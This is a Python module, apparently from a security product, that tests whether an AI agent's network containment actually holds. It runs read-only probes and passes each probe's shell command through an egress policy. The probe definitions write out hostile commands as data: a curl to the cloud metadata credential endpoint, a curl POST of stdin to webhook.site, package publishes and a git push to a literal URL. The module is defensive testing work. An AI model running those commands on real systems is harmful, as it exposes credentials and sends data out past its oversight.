"""
Containment Proof — test the containment boundary instead of asserting it.

The 2026-08 eval-containment incidents had one root cause: containment was
*believed* and never independently verified. A system prompt said there was no
connectivity; there was connectivity. Nothing in the agent's own stack was in a
position to notice.

This service is the answer to that, and its value rests entirely on one
property: **the verdict comes from a party that is neither the agent nor the
harness, and has no incentive to report the boundary as fine.**

Each probe produces three facts, and the third is the one nobody can generate
for themselves:

    | Probe | Blocked by SecureVector | Blocked by your network | Reached anyway |

Correctness rules that are not negotiable:

1. **Never report a pass we did not establish.** An offline machine looks
   identical to a perfectly contained one if you only observe "nothing got
   out". So a control probe runs first against a destination the policy
   *allows*; if the control cannot reach the network, every other result is
   inconclusive and the verdict degrades to `degraded`, naming what was not
   tested. A false "contained" is the one defect that destroys the feature's
   entire reason to exist.

2. **Probes are a self-test, never an attack.** Every destination is either
   link-local (IMDS, which leaves no external traffic), private space (which
   does not route off the machine), or a read-only request to well-known
   public infrastructure. Nothing is written anywhere. No credential is used.
   No third party receives data.

3. **Coverage gaps are printed, not hidden.** The proof states what it could
   not test. An attestation that implies coverage it does not have is worse
   than no attestation.

Known v1 limitation, stated deliberately: without a SecureVector-operated
canary endpoint we infer "reached the internet" from a successful request to
well-known public infrastructure. That answers "did bytes leave this machine"
but not "which specific path did they take". A first-party canary would
sharpen the third column and is tracked as a follow-up.
"""

import asyncio
import logging
import socket
import time
import urllib.error
import urllib.request
from typing import Optional

from securevector.core.egress import (
    BLOCK,
    EgressContext,
    EgressPolicy,
    evaluate_tool_call,
    load_baseline_pack,
)

logger = logging.getLogger(__name__)

# Short by design: a proof that takes a minute will not be run twice.
PROBE_TIMEOUT_SECONDS = 4
# Link-local and private probes are expected to hang; cut them sooner.
UNROUTABLE_TIMEOUT_SECONDS = 2

VERDICT_CONTAINED = "contained"
VERDICT_PARTIAL = "partial"
VERDICT_UNCONTAINED = "uncontained"
VERDICT_DEGRADED = "degraded"
VERDICT_ERROR = "error"


class Probe:
    """One containment test.

    `command` is the shell command the probe *represents*. It is passed through
    the real egress evaluator so the policy verdict here is the same verdict a
    live agent would get. The probe then performs the equivalent network
    operation directly, in-process, rather than spawning a shell: we want to
    test the boundary, not hand an arbitrary command to a subprocess.
    """

    def __init__(self, probe_id, title, category, command, url=None,
                 host=None, port=None, expect_contained=True, timeout=None,
                 is_control=False):
        self.id = probe_id
        self.title = title
        self.category = category
        self.command = command
        self.url = url
        self.host = host
        self.port = port
        # True when a healthy boundary should stop this. The control probe and
        # ordinary reads set this False — blocking them would be a false
        # positive, not containment.
        self.expect_contained = expect_contained
        self.timeout = timeout or PROBE_TIMEOUT_SECONDS
        self.is_control = is_control


def _default_probes() -> list:
    return [
        # --- control -------------------------------------------------------
        # Must run first. If this cannot reach the network, the machine is
        # offline or fully firewalled and NO other probe result can be read as
        # evidence of containment.
        Probe(
            "control.public_read",
            "Baseline connectivity check",
            "control",
            "curl -sS https://pypi.org/simple/",
            url="https://pypi.org/simple/",
            expect_contained=False,
            is_control=True,
        ),
        # --- credential theft path ----------------------------------------
        Probe(
            "imds.aws",
            "Cloud instance metadata (credential endpoint)",
            "credential-exposure",
            "curl http://169.254.169.254/latest/meta-data/",
            url="http://169.254.169.254/latest/meta-data/",
            timeout=UNROUTABLE_TIMEOUT_SECONDS,
        ),
        # --- supply chain --------------------------------------------------
        Probe(
            "publish.pypi",
            "Package publish to PyPI",
            "supply-chain",
            "twine upload dist/*",
            url="https://upload.pypi.org/legacy/",
        ),
        Probe(
            "publish.npm",
            "Package publish to npm",
            "supply-chain",
            "npm publish",
            url="https://registry.npmjs.org/",
        ),
        # --- exfiltration --------------------------------------------------
        Probe(
            "exfil.webhook",
            "POST to an anonymous collection endpoint",
            "exfiltration",
            "curl -X POST -d @- https://webhook.site/probe",
            url="https://webhook.site/",
        ),
        Probe(
            "exfil.git_push",
            "Push to a git remote given as a literal URL",
            "exfiltration",
            "git push https://example.invalid/repo.git main",
            host="example.invalid",
        ),
        # --- lateral movement ----------------------------------------------
        Probe(
            "lateral.private_range",
            "Reach into RFC1918 private address space",
            "lateral-movement",
            "curl -sS http://10.255.255.1/",
            url="http://10.255.255.1/",
            timeout=UNROUTABLE_TIMEOUT_SECONDS,
        ),
    ]


def _attempt_http(url: str, timeout: int) -> dict:
    """Read-only reachability check. Never sends a body, never authenticates.

    A 4xx/5xx still proves reachability: the request left the machine and a
    server answered. Only a transport-level failure means nothing got out.
    """
    req = urllib.request.Request(url, method="GET", headers={
        "User-Agent": "SecureVector-ContainmentProof/1.0 (self-test)",
    })
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return {"reached": True, "detail": f"HTTP {resp.status}"}
    except urllib.error.HTTPError as e:
        return {"reached": True, "detail": f"HTTP {e.code} (server answered)"}
    except urllib.error.URLError as e:
        return {"reached": False, "detail": f"no route: {getattr(e, 'reason', e)}"}
    except socket.timeout:
        return {"reached": False, "detail": "timed out"}
    except Exception as e:  # noqa: BLE001 - a probe must never raise
        return {"reached": False, "detail": f"failed: {type(e).__name__}"}


def _attempt_dns(host: str, timeout: int) -> dict:
    """Resolve only. Proves name resolution works without opening a connection."""
    original = socket.getdefaulttimeout()
    try:
        socket.setdefaulttimeout(timeout)
        socket.getaddrinfo(host, None)
        return {"reached": True, "detail": "resolved"}
    except Exception as e:  # noqa: BLE001
        return {"reached": False, "detail": f"did not resolve: {type(e).__name__}"}
    finally:
        socket.setdefaulttimeout(original)


def _run_probe_sync(probe: Probe) -> dict:
    if probe.url:
        return _attempt_http(probe.url, probe.timeout)
    if probe.host:
        return _attempt_dns(probe.host, probe.timeout)
    return {"reached": False, "detail": "no destination to test"}


async def run_containment_proof(
    policy: Optional[EgressPolicy] = None,
    ctx: Optional[EgressContext] = None,
    probes: Optional[list] = None,
) -> dict:
    """Run the full proof and return probes + verdict + coverage.

    Returns a dict ready to persist via `EgressRepository.save_proof`.
    """
    policy = policy or EgressPolicy()
    ctx = ctx or EgressContext()
    probes = probes or _default_probes()
    pack = load_baseline_pack()

    results = []
    coverage = []
    control_reached = None

    for probe in probes:
        started = time.monotonic()

        # 1. What does the policy say? This is the real evaluator on the real
        #    command string, so the answer matches what a live agent would get.
        try:
            evaluation = evaluate_tool_call(
                "Bash", {"command": probe.command}, policy, ctx, pack=pack
            )
            policy_action = evaluation.action
        except Exception as e:  # noqa: BLE001
            logger.warning("Probe %s failed policy evaluation: %s", probe.id, e)
            policy_action = "error"
        blocked_by_sv = policy_action == BLOCK

        # 2. Did it actually get out? Skipped when we blocked it — the point of
        #    enforcement is that the call does not happen. Reporting the network
        #    result of a call we stopped would be measuring the wrong thing.
        if blocked_by_sv:
            attempt = {"reached": False, "detail": "not attempted (blocked before execution)"}
            attempted = False
        else:
            try:
                attempt = await asyncio.to_thread(_run_probe_sync, probe)
                attempted = True
            except Exception as e:  # noqa: BLE001
                # One probe failing must never take the whole proof down. It is
                # recorded as not-reached with the failure named, so the result
                # is visibly incomplete rather than silently optimistic.
                logger.warning("Probe %s raised: %s", probe.id, e)
                attempt = {"reached": False, "detail": f"probe error: {type(e).__name__}"}
                attempted = False
                coverage.append(
                    f"Probe '{probe.id}' could not run ({type(e).__name__}); "
                    "this containment path was not tested."
                )

        if probe.is_control:
            control_reached = attempt["reached"]

        results.append({
            "id": probe.id,
            "title": probe.title,
            "category": probe.category,
            "command": probe.command,
            "destination": probe.url or probe.host,
            "expect_contained": probe.expect_contained,
            "policy_action": policy_action,
            "blocked_by_securevector": blocked_by_sv,
            "attempted": attempted,
            "reached": bool(attempt["reached"]),
            # Attempted, we did not stop it, and it still did not get out —
            # something else did. That is the customer's own network, and
            # distinguishing it from our enforcement is the honest part.
            "blocked_by_network": attempted and not attempt["reached"],
            "detail": attempt["detail"],
            "duration_ms": int((time.monotonic() - started) * 1000),
        })

    # --- verdict ----------------------------------------------------------
    # Order matters. Degraded is checked FIRST: on an offline machine every
    # dangerous probe fails to reach, which is indistinguishable from perfect
    # containment. Reporting "contained" there would be a false pass, and a
    # false pass destroys the only reason to trust this verdict at all.
    dangerous = [r for r in results if r["expect_contained"]]
    escaped = [r for r in dangerous if r["reached"]]
    enforced = [r for r in dangerous if r["blocked_by_securevector"]]

    if control_reached is False:
        verdict = VERDICT_DEGRADED
        coverage.append(
            "This machine could not reach the public internet during the test, "
            "so containment could not be established. An offline or fully "
            "firewalled machine is indistinguishable from a contained one when "
            "observed this way. These results are inconclusive, NOT a pass."
        )
    elif control_reached is None:
        verdict = VERDICT_ERROR
        coverage.append("Control probe did not run; results are not interpretable.")
    elif escaped:
        verdict = VERDICT_UNCONTAINED
    elif len(enforced) == len(dangerous):
        verdict = VERDICT_CONTAINED
    else:
        # Nothing escaped, but not everything was stopped by us — the customer's
        # own network caught the rest. True today, not guaranteed tomorrow.
        verdict = VERDICT_PARTIAL

    coverage.append(
        "Enforcement is tested at the agent tool boundary. A process that "
        "reaches the network by a path these hooks do not cover (an inline "
        "interpreter, a compiled binary, a shell function) is not visible to "
        "this proof. This is not a test of network-layer isolation."
    )
    coverage.append(
        "A remote MCP server is an egress proxy: only its endpoint is "
        "observable. Any host it reaches downstream is out of view."
    )
    coverage.append(
        "Reachability is inferred from requests to well-known public "
        "infrastructure rather than a first-party canary, so this establishes "
        "that traffic left the machine, not which path it took."
    )

    return {
        "probes": results,
        "verdict": verdict,
        "coverage": coverage,
        "policy_preset": policy.preset,
        "summary": {
            "total": len(results),
            "dangerous": len(dangerous),
            "blocked_by_securevector": len(enforced),
            "blocked_by_network": sum(1 for r in dangerous if r["blocked_by_network"]),
            "reached_anyway": len(escaped),
        },
    }


def preflight_manifest() -> dict:
    """Exactly what the proof will do, for a security team to read first.

    A tool that deliberately attempts egress looks like reconnaissance to an
    endpoint agent. Publishing the manifest up front is what makes the
    difference between a self-test and something that gets quarantined, and it
    is why this must never run without the operator initiating it.
    """
    return {
        "description": (
            "A controlled self-test that attempts a small, fixed set of network "
            "operations to determine whether this machine's agent containment "
            "is real. It is read-only: no data is sent to any third party, no "
            "credential is used, and nothing is published anywhere."
        ),
        "requires_user_initiation": True,
        "destinations": sorted({
            p.url or p.host for p in _default_probes() if (p.url or p.host)
        }),
        "operations": [
            "HTTP GET (no request body, no authentication)",
            "DNS resolution",
        ],
        "never_does": [
            "Send file contents, prompts, or tool output anywhere",
            "Authenticate to any registry or service",
            "Publish, upload, or push any artifact",
            "Write to any remote destination",
        ],
        "note_for_endpoint_security": (
            "The instance-metadata probe (169.254.169.254) is link-local and "
            "generates no external traffic, but may match reconnaissance "
            "heuristics in EDR tooling. Allowlist the SecureVector local app "
            "process if this fires."
        ),
    }
